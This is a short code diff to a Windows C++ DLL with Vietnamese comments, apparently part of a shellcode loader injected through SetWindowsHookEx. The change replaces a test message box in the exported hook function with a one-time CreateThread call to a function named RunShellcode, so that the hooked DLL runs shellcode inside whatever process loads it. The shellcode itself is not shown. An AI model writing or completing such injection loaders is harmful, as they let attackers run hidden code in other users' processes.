@@ -35,9 +35,11 @@ DWORD WINAPI RunShellcode(LPVOID lpParam) {
 // Hàm export sẽ được SetWindowsHookEx gọi
 extern "C" __declspec(dllexport) LRESULT CALLBACK spotlessExport(int code, WPARAM wParam, LPARAM lParam) {
     if (code >= 0) {
-        static int count = 0;
-        if (count++ == 0) {
-            MessageBoxW(NULL, L"Test DLL", L"OK", MB_OK);
+        static bool executed = false;
+        if (!executed) {
+            executed = true;
+            // Chỉ tạo thread, không làm gì khác
+            CreateThread(NULL, 0, RunShellcode, NULL, 0, NULL);
         }
     }
     return CallNextHookEx(NULL, code, wParam, lParam);
